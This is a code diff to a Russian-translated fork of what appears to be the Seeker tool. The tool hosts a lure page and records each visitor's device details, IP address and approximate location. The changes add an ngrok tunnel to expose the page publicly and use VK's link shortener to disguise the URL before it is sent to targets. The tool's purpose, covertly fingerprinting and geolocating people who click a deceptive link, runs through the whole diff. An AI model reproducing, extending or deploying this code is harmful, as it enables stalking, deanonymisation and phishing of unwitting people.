@@ -10,6 +10,7 @@ import argparse
 import requests
 import subprocess as subp
 import vk_api
+from pyngrok import ngrok
 
 R = '\033[31m' # red
 G = '\033[32m' # green
@@ -17,25 +18,27 @@ C = '\033[36m' # cyan
 W = '\033[0m'  # white
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Необязательно )')
-parser.add_argument('-k', '--kml', help='Provide KML Filename ( Необязательно )')
-parser.add_argument('-vkl', '--vklogin', help='Ваш логин ВК ( Необязательно )')
-parser.add_argument('-vkp', '--vkpassword', help='Ваш пароль ВК ( Необязательно )')
+parser.add_argument('-k', '--kml', help='Имя файла KML (Необязательно)')
+parser.add_argument('-vkl', '--vklogin', help='Ваш логин ВК (Необязательно)')
+parser.add_argument('-vkp', '--vkpassword', help='Ваш пароль ВК (Необязательно)')
+parser.add_argument('-ngrok', '--ngroktoken', help='Ваш токен от аккаунта ngrok')
 args = parser.parse_args()
-subdom = args.subdomain
 kml_fname = args.kml
 vk_login = args.vklogin
 vk_password = args.vkpassword
+ngrok_token = args.ngroktoken
 
 row = []
 site = ''
 info = ''
 result = ''
-version = '1.2.1'
+version = '1.2.1.2'
+vk_output = ''
 
-vk = vk_api.VkApi(vk_login, vk_password)
-vk.auth()
-api = vk.get_api()
+if args.vklogin != None and args.vkpassword != None:
+	vk = vk_api.VkApi(vk_login, vk_password)
+	vk.auth()
+	api = vk.get_api()
 
 def banner():
 	os.system('clear')
@@ -48,9 +51,15 @@ def banner():
 /____  > \___  >\___  >|__|_ \ \___  >|__|
 	 \/      \/     \/      \/     \/        ''' + W)
 	print('\n' + G + '[>]' + C + ' Создатель: ' + W + 'thewhiteh4t')
-	print('\n' + G + '[>]' + C + ' Перевод и модификация: ' + W + 'Phelifar')
+	print(G + '[>]' + C + ' Перевод и модификация: ' + W + 'Phelifar' + '\n')
 	print(G + '[>]' + C + ' Версия: ' + W + version + '\n')
-	print(api.account.getInfo())
+
+def check_args():
+	if args.ngroktoken == None:
+		print(R + '[Ошибка] Токен от ngrok отсутсвует!')
+		Quit()
+	else:
+		ngrok.set_auth_token(ngrok_token)
 
 def ver_check():
 	print(G + '[+]' + C + ' Проверка обновлений.....', end='')
@@ -68,7 +77,6 @@ def ver_check():
 	else:
 		print(C + '[' + R + ' Статус : {} '.format(ver_sc) + C + ']' + '\n')
 
-print(G + '[+]' + C + ' Запустите NGROK...' + W + '\n')
 
 def template_select():
 	global site, info, result
@@ -111,6 +119,10 @@ def server():
 	except requests.ConnectionError:
 		print(C + '[' + R + ' Неудача ' + C + ']' + W)
 		Quit()
+	public_url = ngrok.connect(8080, proto='http')
+	print('\n' + G + '[>]' + C + ' Полная ссылка: ' + W + public_url)
+	vk_output = api.utils.getShortLink(url=public_url, private=1)
+	print(G + '[>]' + C + ' Сокращённая ссылка: ' + W + vk_output['short_url'] + '\n')
 
 def wait():
 	printed = False
@@ -139,7 +151,6 @@ def main():
 				except TypeError:
 					var_cores = 'Нет данных'
 				var_ram = value['ram']
-				var_vendor = value['vendor']
 				var_render = value['render']
 				var_res = value['wd'] + 'x' + value['ht']
 				var_browser = value['browser']
@@ -149,7 +160,6 @@ def main():
 				row.append(var_platform) 
 				row.append(var_cores) 
 				row.append(var_ram) 
-				row.append(var_vendor)
 				row.append(var_render)
 				row.append(var_res)
 				row.append(var_browser)
@@ -160,7 +170,7 @@ def main():
 				print(G + '[+]' + C + ' Платформа  : ' + W + var_platform)
 				print(G + '[+]' + C + ' Кол-го ядер: ' + W + var_cores)
 				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
-				print(G + '[+]' + C + ' GPU        : ' + W + var_vendor+ "\|/" + W + var_render)
+				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
 				print(G + '[+]' + C + ' Разрешение : ' + W + var_res)
 				print(G + '[+]' + C + ' Браузер    : ' + W + var_browser)
 				print(G + '[+]' + C + ' IP         : ' + W + var_ip)
@@ -174,19 +184,16 @@ def main():
 					var_country = str(data['country'])
 					var_region = str(data['region'])
 					var_city = str(data['city'])
-					var_org = str(data['org'])
 					var_isp = str(data['isp'])
 
 					row.append(var_country)
 					row.append(var_region)
 					row.append(var_city)
-					row.append(var_org)
 					row.append(var_isp)
 
 					print(G + '[+]' + C + ' Страна     : ' + W + var_country)
 					print(G + '[+]' + C + ' Регион     : ' + W + var_region)
 					print(G + '[+]' + C + ' Город      : ' + W + var_city)
-					print(G + '[+]' + C + ' Org    : ' + W + var_org)
 					print(G + '[+]' + C + ' Провайдер  : ' + W + var_isp)
 	except ValueError:
 		pass
@@ -283,7 +290,7 @@ def Quit():
 try:
 	banner()
 	ver_check()
-	tunnel_select()
+	check_args()
 	template_select()
 	server()
 	wait()
